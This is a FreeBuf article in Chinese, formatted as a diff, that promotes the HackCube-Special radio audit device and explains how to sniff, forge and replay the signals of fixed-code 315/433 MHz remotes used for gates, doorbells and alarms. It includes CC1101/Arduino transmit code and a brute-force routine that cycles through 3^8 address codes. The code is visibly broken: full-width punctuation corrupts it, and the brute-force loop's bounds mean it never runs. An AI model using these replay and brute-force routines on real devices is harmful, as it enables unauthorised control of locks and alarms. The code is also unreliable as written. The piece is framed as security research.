@@ -1,0 +1,311 @@
+## 前言
+
+ **HackCube-Special
+在我们做无线安全研究的工作中，常常在户外环境中对一些设备进行安全检测，需要抱着电脑，连接无线设备，蹲着或者坐在地上，总是吸引不少人的眼球，十分尴尬。于是我们希望打造一款小巧的设备，只需要把它装进口袋，通过手机或者平板电脑，就能特别方便的对这些设备进行安全审计。**
+
+这就是我们做 HackCube-Special 的初衷。HackCube-Special
+是一款低成本，便携式，可工作在多个无线射频频段的无线电安全审计平台。我们会给 HackCube-Special
+提供丰富的案例，方便初学者能够更好的了解无线电安全领域。
+
+![20181025165514.png](https://image.3001.net/images/20181211/1544496651_5c0f260b75375.png!small)
+
+### 使用HackCube-Special研究固定码遥控的安全风险
+
+![41469324.png](https://image.3001.net/images/20181211/1544496672_5c0f26209ae91.png!small)
+
+### 目标设备
+
+我们先来看看有哪些设备在使用固定码遥控信号吧。通常在生活中比较常见的有那些呢，像平时停车场用的抬杠啊，或者是家庭常见的无线门铃用的就是这种芯片，还有说烟雾报警器或者门磁报警器，然后在我写文章时候一位不肯透漏姓名的雪碧
+0xroot
+同学告诉我，某个女性用的无线情趣用品用的也是这种方案的，然后还有我们电瓶车啊，投影屏遥控用的可能就是这些芯片，我们来看看这中间存在什么安全风险吧。
+
+### 频点信息
+
+![61872913.png](https://image.3001.net/images/20181211/1544496702_5c0f263ee8465.png!small)
+
+这些设备通常工作在 315MHz，433MHz。极个别会工作在 868MHz，915MHz 这几个频点上，基本上都采用 ASK
+调制方式，可以通过晶振，FCC ID 来确定设备的工作频点信息。
+
+### 固定码遥控信号的构成
+
+![62268739.png](https://image.3001.net/images/20181211/1544496739_5c0f2663762a9.png!small)![62289215.png](https://image.3001.net/images/20181211/1544496739_5c0f266399bbe.png!small)
+
+上面两张图，是我们采集的两款常见的无线遥控模块发出的信号。信号分别是同步引导码，地址位和数据位，最后一个就是停止码，停止码没有特别的用处只是为了结束程序用的。这里有两段信号，后面会讲下这两种信号的区别，这两种相比于其他的更为常见，先来看下这个同步码，这个同步码处于信号的最前端，用于告诉接收端有信号过来准备接收用的，接收同步引导码程序才开始解码，没有则继续等待，但在后面的写爆破程序中发现，其实可以吧这段同步码给忽略掉并不会对控制有什么影响，并且还能给爆破省下不少时间。同步码后有一大串的空白时间，这个时间的作用是为了让发射端和接收端同步时钟用的。
+
+### 信号脉冲
+
+![56787737.png](https://image.3001.net/images/20181211/1544496759_5c0f2677573f8.png!small)
+
+信号脉冲的宽度跟电压，震荡电阻是有关系的。我们可以算出信号的震荡周期（a=两倍的时钟震荡周期）f=2100016/Rosc(kΩ) kHz 其中 Rosc
+为振荡电阻。
+
+我们来看下这两种信号的区别，第一种信号吧 Bit1 相当于 12A 宽度的高电平脉冲加 4A 宽度低电平的脉冲重复一次，而BIt0正好相反是 4a 高在是
+12a 的低重复一次。然后说下 BitF，BitF 只会出现在地址位里面，代表该地址位引脚悬空，后面会提到，无效码则不可能出现在 2262
+这种协议中，如果出现了只能表示这个信号是 2240 的。
+
+现在来说下第二种信号格式，第二种与第一种不同，非常明显能看出来第一种是把一段信号重复了两次来表示BIT1 和 BIT0，并且有三种表示方式。第二种呢就是
+12A 宽度的高电平脉冲信号加上 4A 的低电平宽度脉冲信号就是 BIT1，相反的就是 BIT0，并且不像第一种那样数据有 3 种表示方式。
+
+### 地址码
+
+![62945527.png](https://image.3001.net/images/20181211/1544496841_5c0f26c964ba6.png!small)
+
+先来看下遥控模块的硬件到底长什么样，第一种的银色是晶体振荡器一般会把频率直接写在上面，然后下面那个就是 PT2262 编码
+IC。看完正面来看下遥控的背面，下面的就是地址码的编码部分了。H 字母就 HIGH 的缩写代表高电平信号，一般是电源，然后 L 呢就是 LOW
+的缩写代表低电平的信号，一般是 GND。然后就是 8 位的地址码，然后可以自定义引脚，引脚接高电平当信号发射时该位就出现上面提到的
+Bit1，然后该引脚接地就是低电平信号就出现 Bit0。如果像图上那样什么都不接的话，就会出现 BitF，因为只有这三种表示的状态所以才不会出现无效码！
+
+然而第二种呢，地址码是出厂时预烧录的，用户是没有办法自设的，这点需要注意。然后来看下这两种最大的区别，第一种地址码位 8Bit，但是有 3
+种表示状态。而第二种地址码有 20Bit 只有 2 种表示状态，算下 3 的 8 次方等于
+6561，就是生产出这么多个设备后就会出现重复的遥控地址码了。然后是第二种，2 的 20 次方等于
+1048576，要生产出一百多万个后才会出现重复的遥控地址码。还有一个很重要的点就是第一种通过爆破地址码来控制设备只要十几分钟的时间甚至更少，第二种通过爆破地址码的方式来操控设备则需要几十个小时的时间。但这两种都属于固定码，只要监听到一次信号就能够复制信号了。
+
+![1544496860_5c0f26dcacb1c.png!small](https://image.3001.net/images/20181211/1544496860_5c0f26dcacb1c.png!small)
+
+![1544496867_5c0f26e363f1a.png!small](https://image.3001.net/images/20181211/1544496867_5c0f26e363f1a.png!small)
+
+然后我们就可以用软件无线电对这个遥控进行解码了，这个就是解码后的数据了，但是这种解码的方式特别费时间。
+
+### 嗅探数据
+
+![1544496874_5c0f26ea54ce3.png!small](https://image.3001.net/images/20181211/1544496874_5c0f26ea54ce3.png!small)
+
+如何去接收这类遥控射频信号呢？我们可以使用这个 CC1101 模块然后让其工作在异步模式下去接收这个遥控的信号。
+
+    
+    
+    #include "cc1101。h"
+    CC1101 cc1101;
+    //参考datasheet写的一个设置工作射频频率的函数，可以使用SmartRF Studio计算得出
+    void setfreqx(unsigned long int freq) { 
+      unsigned long freqnum = freq / 396。734569;
+      byte freqx[3];
+      freqx[0] = freqnum;
+      freqx[1] = freqnum >> 8;
+      freqx[2] = freqnum >> 16;
+      cc1101。writeReg(CC1101_FREQ2， freqx[2]);
+      cc1101。writeReg(CC1101_FREQ1， freqx[1]);
+      cc1101。writeReg(CC1101_FREQ0， freqx[0]);
+    }
+    //CC1101 射频芯片初始化函数
+    void cc1101_config() {
+      cc1101。SS_PIN = 10; //定义CC1101 片选引脚
+      cc1101。init(); //初始化函数，配置我们在库中定义好的射频参数
+      setfreqx(315000000); //设置中心频率
+      cc1101。disableAddressCheck();
+      cc1101。writeReg(CC1101_IOCFG2， 0x0d);//配置成异步模式
+      cc1101。writeReg(CC1101_MDMCFG4， 0xF7);//配置接收速率
+      cc1101。writeReg(CC1101_MDMCFG3， 0x93);//配置接收速率
+      //cc1101。writeReg(CC1101_AGCCTRL2， 0xB0);//配置门限值
+      cc1101。cmdStrobe(CC1101_SRX); //进入RX接收数据状态
+    }
+
+将 CC1101 射频模块进行配置成异步模式。
+
+![1544496890_5c0f26fa07d27.png!small](https://image.3001.net/images/20181211/1544496890_5c0f26fa07d27.png!small)![1544496911_5c0f270f23f6b.png!small](https://image.3001.net/images/20181211/1544496911_5c0f270f23f6b.png!small)
+
+上面这个是采集到的原始的射频数据，而下面这个就是 CC1101 的 GDO2 引脚的波形信号，也就是解调 ASK
+后的数据，然后可以通过这个去解码数据内容。然后我们来说说如何去解码这个数据，一般解码这个数据分为两种方式一种是使用中断去将数据接收下，另外一种是通过轮询引脚方式待会详细讲讲这两种的区别吧，还有其他方式会用定时器去捕获，但是这种方式用的比较少。
+
+![1544496918_5c0f2716af291.png!small](https://image.3001.net/images/20181211/1544496918_5c0f2716af291.png!small)
+
+刚刚说到上面这一栏就是经过 cc1101 射频芯片 ASK 后的数据解调后的输出，而信号数据下面一栏就是采用 CHANGE
+类型中断触发的脉冲信号，每次上面的数据信号发生脉冲变化时候 (高电平->低电平/低电平->高电平) 就会进入到我们的中断函数中。
+
+    
+    
+    attachInterrupt(interrupt， ISR， mode);
+    interrupt 中断号
+    ISR 中断调用的函数
+    mode 中断触发类型
+    LOW 低电平触发
+    CHANGE 电平变化触发
+    RISING 上升沿触发（由LOW变为HIGH）
+    FALLING 下降沿触发（由HIGH变为LOW）
+
+我们来看看这个 attachInterrupt 中断函数，首先是中断引脚，这里我们用的是 atmega32u4 单片机，板子只有 2，3
+两个中断引脚，对应就是 0，1 两个中断号，把 CC1101 的 GDO2 接到单片机的 2 号引脚。设置 0 中断号进行触发，而 ISR
+这是触发中断后进入的函数。我这里是使用了 RCSwitch 的库函数。不必要重复造轮子。
+
+![1544496937_5c0f272950274.png!small](https://image.3001.net/images/20181211/1544496937_5c0f272950274.png!small)
+
+    
+    
+    Decimal: 96857 (24Bit) Binary: 000000010111101001011001 Tri-State: not applicable PulseLength: 272 microseconds Protocol: 1 Raw data: 8424，296，792，288，800，296，792，296，792，264，808，296，792，280，784，848，264，296，792，832，248，840，272，816，264，840，96，704，152，912，120，296，792，288，784，848，264，296，768，840，280，824，264，272，800，320，768，848，296，
+
+我们只要在 ISR 函数中根据上次中断触发的时间进行计时，就能得到每个脉冲持续的时间。
+
+![1544496942_5c0f272ebd8d5.png!small](https://image.3001.net/images/20181211/1544496942_5c0f272ebd8d5.png!small)
+
+我们只需要根据脉冲时间就能够解出信号数据，000000010111101001011001 就是我们脉冲所传输的二进制数据，转成十进制就是
+96857(HEX:17A59)，其中的功能码为
+9。所谓固定码就是这个地址码是固定的，每一次发送的数据除了功能码都是一样的，只要我们嗅探到遥控模块的地址码就能够这对这个设备进行攻击测试了。
+
+![1544496948_5c0f2734ac496.png!small](https://image.3001.net/images/20181211/1544496948_5c0f2734ac496.png!small)
+
+然后在 HackCube-Special 后台列表中就能发现信号。
+
+### 伪造信号
+
+![1544496954_5c0f273a14ab7.png!small](https://image.3001.net/images/20181211/1544496954_5c0f273a14ab7.png!small)
+
+刚刚提到了我们使用 CC1101，使其工作在异步模式中，GDO2 是数据输出引脚，如果我们要发射信号的话，我们需要用到 cc1101 的 GDO0
+引脚作为发射信号的数据输入引脚。
+
+    
+    
+    void Fixed_Config() {
+      cc1101。SS_PIN = 10; //定义CC1101 片选引脚
+      cc1101。init(); //初始化函数，配置我们在库中定义好的射频参数
+      setfreqx(315000000); //设置中心频率
+      cc1101。cmdStrobe(CC1101_STX);//设置工作模式为"STX"发射模式
+      cc1101。writeReg(CC1101_IOCFG2， 0x0d);//设置为异步模式
+    }
+
+和刚刚接收使用的配置类似，只需要将 CC1101 设置为 STX 状态即可。
+
+    
+    
+    // Fixed_Transmitpin = CC1101_GDO0
+     ______________
+    |              |_____|XXXXXXXXXXXXX|     
+         915us      305us
+    void Fixed_Bit1() {
+      digitalWrite(Fixed_Transmitpin， HIGH);
+      delayMicroseconds(915);
+      digitalWrite(Fixed_Transmitpin， LOW);
+      delayMicroseconds(305);
+      digitalWrite(Fixed_Transmitpin， LOW);
+    }
+     _____
+    |     |______________|XXXXXXXXXXXXX|
+     305us      915us
+    void Fixed_Bit0() {
+      digitalWrite(Fixed_Transmitpin， HIGH);
+      delayMicroseconds(305);
+      digitalWrite(Fixed_Transmitpin， LOW);
+      delayMicroseconds(915);
+      digitalWrite(Fixed_Transmitpin， LOW);
+    }
+    void Class2_Transmit(unsigned long data， int Func) {
+      // data = 地址码
+      // fnc = 功能码
+      for (int a = 20; a > 0; a--) { // 产生地址码波形 20 bit
+        if (data >> a - 1 & 1 == 1) {
+          Fixed_Bit1();
+        } else {
+          Fixed_Bit0();
+        }
+      }
+      for (int l = 4; l > 0; l--) { // 产生功能码波形 4 bit
+        if (Func >> l - 1 & 1 == 1) {
+          Fixed_Bit1();
+        } else {
+          Fixed_Bit0();
+        }
+      }
+      Fixed_Bit0(); //产生停止码
+    }
+
+我们以伪造第二种固定码协议举例。Fixed_Transmitpin 接的是 CC1101 的 GDO0 引脚，根据输入的 data，func 在 GDO0
+产生出对应的电平信号，然后再由 cc1101 进行 ASK 将数据发射出来就可以了。
+
+![1544496961_5c0f27419a1e1.png!small](https://image.3001.net/images/20181211/1544496961_5c0f27419a1e1.png!small)
+
+我们 HackCube-Special 也封装好了函数，只需要填入所需要发射的数据就可以了。
+
+### 爆破固定码
+
+之前我们有提到一共有两种固定码的协议一种是 3^8，另外一种
+2^20，前一种可以通过焊盘进行改变的，而另外一种则是出厂就固定了无法进行更改，但是我们在没有嗅探到信号的情况下怎么对这种设备进行攻击呢?
+我们只要爆破这个地址码就可以了。第一种 3^8 有 6561
+种可能性，8424us(同步码)+30500us(数据位)+12000(间隔时间)*4(重复次数)，一共需要 1336.449456 秒，大概需要 22
+分钟左右，但是在测试中发现同步码可以省去，并且可以把重复次数减少到 1 次，那么只需要 4.64 分钟就可以将 3^8 固定码跑完。
+
+    
+    
+    void Class1_Attack() {
+      Fixed_Config_Class1();
+      cc1101。PrintConfig();
+      pinMode(RF_GDO0， OUTPUT);
+      unsigned int EndNum = 0x0;
+      unsigned int SerialNum = 0x5406;
+      //Class 1 8Bit的地址码类型 爆破函数
+      //SerialNum 开始爆破地址码
+      //EndNum 结束地址码
+      while (SerialNum < EndNum) { //循环爆破地址码范围
+          for (int i = 0; i < 8 ; ++i) { //循环8个Bit 
+            if ((3 << (i * 2)&SerialNum) >> (i * 2) == 2 )//判断是否有之前提到的无效码
+              SerialNum = SerialNum + (1 << (i * 2));//出现无效码就序列号+1 跳过
+          }
+          for (int i = 0; i < 2; i++) { //数据重复发送两次
+            Class1_Transmit(SerialNum);//调用发射函数
+            delay(12);//发射延迟
+          }
+          SerialNum = SerialNum + 1;//序列递增
+      }
+    }
+
+上面这段就是爆破 3^8 地址码的代码。
+
+### 总结
+
+在 Freebuf
+这个平台上，已经有十篇左右对固定码进行分析的文章，使用到各种软件无线电软件，Gnuradio，Inspectrum，audacity，rtl_433。各种硬件，电视棒，HackRF，USRP，逻辑分析仪，超再生模块，EZ430，树莓派，Arduino
+单片机。这些方法都比较繁琐。但现在我们可以使用一个 HackCube-Special 就能够进行这样的研究分析。
+
+从以上分析可以看出，固定码遥控的安全风险是比较高的，很容易攻击成功。原因是这类无线遥控设备本身的价值就不高，若在安全方面增加太多成本，例如使用滚动码或者双向交互式认证，产品价格是难以承受的。在安全与成本之间，找到恰当的平衡点，是一个永恒的问题。以上方法
+(代码) 带有一定攻击性，仅供安全研究之用，读者请勿做其他用途。
+
+我们的硬件产品预计会在 12 月份月底左右上线,
+在我们[社区](https://unicorn.360.com/hackcube/)上提交质量不错的文章是有机会拿到第一时间产品的哟，有任何问题的欢迎在社区上与我们交流。
+
+## 演示视频
+
+  
+
+## 参考链接
+
+> <https://future-sec.com/wireless-signal-replay-attack-and-reverse-with-> LimeSDR.html>[&ampgt](https://future-sec.com/wireless-signal-replay-attack-> and-reverse-with-LimeSDR.html);
+>
+>
+> <https://github.com/ComThings/PandwaRF/wiki>[&ampgt](https://github.com/ComThings/PandwaRF/wiki);
+>
+>
+> <https://github.com/merbanan/rtl_433>[&ampgt](https://github.com/merbanan/rtl_433);
+>
+> [http://image.3001.net/uploads/pdf/无线遥控信号分析入门
+> v3.pdf&ampgt](http://image.3001.net/uploads/pdf/%E6%97%A0%E7%BA%BF%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8v3.pdf);
+>
+>
+> <https://www.cnblogs.com/k1two2/p/4762810.html>[&ampgt](https://www.cnblogs.com/k1two2/p/4762810.html);
+>
+>
+> <https://www.cnblogs.com/k1two2/p/5268531.html>[&ampgt](https://www.cnblogs.com/k1two2/p/5268531.html);
+>
+>
+> <http://www.freebuf.com/articles/wireless/111801.html>[&ampgt](http://www.freebuf.com/articles/wireless/111801.html);
+>
+>
+> <http://www.freebuf.com/articles/wireless/105398.html>[&ampgt](http://www.freebuf.com/articles/wireless/105398.html);
+>
+>
+> <http://www.freebuf.com/articles/wireless/126330.html>[&ampgt](http://www.freebuf.com/articles/wireless/126330.html);
+>
+>
+> <http://www.freebuf.com/articles/wireless/115289.html>[&ampgt](http://www.freebuf.com/articles/wireless/115289.html);
+>
+>
+> <http://www.freebuf.com/articles/wireless/105398.html>[&ampgt](http://www.freebuf.com/articles/wireless/105398.html);
+>
+>
+> <http://www.freebuf.com/articles/wireless/165566.html>[&ampgt](http://www.freebuf.com/articles/wireless/165566.html);
+>
+>
+> <http://www.freebuf.com/articles/wireless/146781.html>[&ampgt](http://www.freebuf.com/articles/wireless/146781.html);
+>
+>
+> <http://www.freebuf.com/fevents/164699.html>[&ampgt](http://www.freebuf.com/fevents/164699.html);
+
+* **本文作者：mobier，转载请注明来自FreeBuf.COM**
+
